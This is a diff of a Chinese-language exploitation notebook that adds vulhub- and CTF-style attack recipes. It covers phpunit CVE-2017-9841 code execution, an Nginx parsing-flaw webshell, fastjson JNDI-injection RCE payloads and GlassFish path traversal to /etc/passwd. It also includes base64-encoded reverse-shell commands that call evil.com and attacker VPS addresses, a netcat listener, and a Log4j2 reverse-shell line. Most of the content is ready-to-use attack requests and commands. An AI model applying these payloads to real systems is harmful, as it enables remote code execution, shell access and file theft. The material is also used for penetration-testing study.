@@ -14,6 +14,8 @@
         - [CVE-2018-12613](#CVE-2018-12613)
     - [XDebug-RCE](#XDebug-RCE)
     - [inclusion](#inclusion)
+    - [phpunit](#phpunit)
+        - [CVE-2017-9841](#CVE-2017-9841)
 - [Python](#Python)
     - [Flask](#Flask)
         - [Jinja2](#Jinja2)
@@ -62,9 +64,11 @@
     - [Postgres](#Postgres)
         - [CVE-2019-9193](#CVE-2019-9193)
 
-
-- [uWSGI](#uWSGI)
-    - [CVE-2018-7490](#CVE-2018-7490)
+- [应用服务器](#应用服务器)
+    - [GlassFish](#GlassFish)
+        - [任意文件读取漏洞](#任意文件读取漏洞)
+    - [uWSGI](#uWSGI)
+        - [CVE-2018-7490](#CVE-2018-7490)
 - [Jupyter](#Jupyter)
     - [notebook-rce](#notebook-rce)
 
@@ -249,6 +253,33 @@ python exp.py your-ip 8080 100
 
 - 参考文章
     - https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md
+
+### phpunit
+
+phpunit是php中的单元测试工具
+
+#### CVE-2017-9841
+
+> phpunit 远程代码执行漏洞（CVE-2017-9841）
+
+- 影响版本：4.8.19 ~ 4.8.27和5.0.10 ~ 5.6.2
+- 漏洞详情
+    - vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php文件有如下代码：
+    ```php
+    eval('?>'.file_get_contents('php://input'));
+    ```
+- 漏洞利用
+
+```
+POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
+HOST:xxxxx
+
+<?=phpinfo()?>
+```
+
+![image](./img/phpunit.png)
+
+`<?=system('env')?>`
 ## Python
 ### Flask
 #### Jinja2
@@ -266,11 +297,29 @@ id
 
 ### Django
 
+#### CVE-2019-14234
+
 
 ## 框架引擎中间件
 
 ### Nginx
 
+#### Nginx解析漏洞
+
+- 漏洞描述
+    - nginx解析漏洞因为用户配置不当造成的漏洞。
+    - 1.jpg/.php、1.jpg/.php，1.jpg会被当成php格式解析
+
+- 漏洞利用
+
+上传图片马
+```
+http://node4.buuoj.cn:26749/uploadfiles/e07db0b27893a41573453510ee2dceed.png/.php
+```
+
+不添加.php的时候为404
+
+![image](./img/nginx-jiexi.png)
 ### httpd
 
 #### Apache—HTTPD-多后缀解析漏洞
@@ -603,6 +652,82 @@ run
 参考文章：
 - https://www.cnblogs.com/qianxinggz/p/13440366.html
 
+
+## 组件
+
+### fastjson
+
+Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。
+
+#### 漏洞扫描探测
+
+- https://github.com/Maskhe/FastjsonScan
+
+需要post参数，没有参数的情况下填写（以下两种都可，否则为notsupport）
+```
+{}
+params=1
+```
+#### 1.2.24-rce
+
+方法同理1.2.27，payload不一样
+
+```
+{
+    "b":{
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"rmi://evil.com:9999/TouchFile",
+        "autoCommit":true
+    }
+}
+```
+
+#### 1.2.27-rce
+
+影响版本：fastjson <= 1.2.47
+
+**JNDI注入**
+
+相关工具：https://github.com/welk1n/JNDI-Injection-Exploit
+
+反弹shell需要先编码成base64
+
+在线java编码网站：[java.lang.Runtime.exec() Payload Workarounds](https://www.jackson-t.ca/runtime-exec-payloads.html)
+
+如：`sh -i >& /dev/tcp/111.111.111.111/8888 0>&1`需要先拖进去编码
+
+首先要启动一个 RMI 或者 LDAP 服务：在VPS上执行
+```
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "<payload>" -A <vps>
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy41MS4yNTMvODg4OCAwPiYx}|{base64,-d}|{bash,-i}" -A 111.111.111.111
+```
+
+![image](./img/fastjson2.png)
+
+监听8888端口:
+
+```
+nc -lvnp 8888
+```
+
+目标站点抓包发送如下payload，header需要添加POST的`Content-Type: application/json`
+```
+{
+    "a":{
+        "@type":"java.lang.Class",
+        "val":"com.sun.rowset.JdbcRowSetImpl"
+    },
+    "b":{
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"ldap://111.111.111.111:1389/yomh4h",
+        "autoCommit":true
+    }
+}
+```
+![image](./img/fastjson1.png)
+
+![image](./img/fastjson3.png)
+
 ## Ruby
 
 ### Rails
@@ -666,12 +791,26 @@ SELECT * FROM cmd_exec;
 
 ![image](./img/postgres1.png)
 
+## 应用服务器
+### GlassFish
 
-## uWSGI
+GlassFish 是一款强健的商业兼容应用服务器，达到产品级质量，可免费用于开发、部署和重新分发。开发者可以免费获得源代码，还可以对代码进行更改
+
+#### 任意文件读取漏洞
+
+- 漏洞详情
+    - java语言中会把%c0%ae解析为\uC0AE，最后转义为ASCCII字符的.（点）。利用`%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/`来向上跳转，达到目录穿越、任意文件读取的效果。
+- 漏洞利用
+
+```
+https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+```
+
+### uWSGI
 
 uWSGI是一款Web应用程序服务器，它实现了WSGI、uwsgi和http等协议，并支持通过插件来运行各种语言。
 
-### CVE-2018-7490
+#### CVE-2018-7490
 
 uWSGI 2.0.17之前的PHP插件，没有正确的处理DOCUMENT_ROOT检测，导致用户可以通过..%2f来跨越目录，读取或运行DOCUMENT_ROOT目录以外的文件。
 
@@ -702,83 +841,6 @@ ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用
 
 ### CVE-2016–3714
 
-## 
-## fastjson
-
-Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。
-
-### 漏洞扫描探测
-
-- https://github.com/Maskhe/FastjsonScan
-
-需要post参数，没有参数的情况下填写（以下两种都可，否则为notsupport）
-```
-{}
-params=1
-```
-### 1.2.24-rce
-
-方法同理1.2.27，payload不一样
-
-```
-{
-    "b":{
-        "@type":"com.sun.rowset.JdbcRowSetImpl",
-        "dataSourceName":"rmi://evil.com:9999/TouchFile",
-        "autoCommit":true
-    }
-}
-```
-
-### 1.2.27-rce
-
-影响版本：fastjson <= 1.2.47
-
-**JNDI注入**
-
-相关工具：https://github.com/welk1n/JNDI-Injection-Exploit
-
-反弹shell需要先编码成base64
-
-在线java编码网站：[java.lang.Runtime.exec() Payload Workarounds](https://www.jackson-t.ca/runtime-exec-payloads.html)
-
-如：`sh -i >& /dev/tcp/111.111.111.111/8888 0>&1`需要先拖进去编码
-
-首先要启动一个 RMI 或者 LDAP 服务：在VPS上执行
-```
-java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "<payload>" -A <vps>
-java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNy41MS4yNTMvODg4OCAwPiYx}|{base64,-d}|{bash,-i}" -A 111.111.111.111
-```
-
-![image](./img/fastjson2.png)
-
-监听8888端口:
-
-```
-nc -lvnp 8888
-```
-
-目标站点抓包发送如下payload，header需要添加POST的`Content-Type: application/json`
-```
-{
-    "a":{
-        "@type":"java.lang.Class",
-        "val":"com.sun.rowset.JdbcRowSetImpl"
-    },
-    "b":{
-        "@type":"com.sun.rowset.JdbcRowSetImpl",
-        "dataSourceName":"ldap://111.111.111.111:1389/yomh4h",
-        "autoCommit":true
-    }
-}
-```
-![image](./img/fastjson1.png)
-
-![image](./img/fastjson3.png)
-
-
-
-
 ### Log4j2
 
 Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。在大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。攻击者利用此特性可通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。
@@ -801,7 +863,7 @@ sh -i >& /dev/tcp/10.30.1.49/7777 0>&1
 
 https://www.jackson-t.ca/runtime-exec-payloads.html
 
-java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMzAuMS41My83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}" -A 10.30.1.53
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yLjEzMS83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}" -A 192.168.2.131
 
 
 
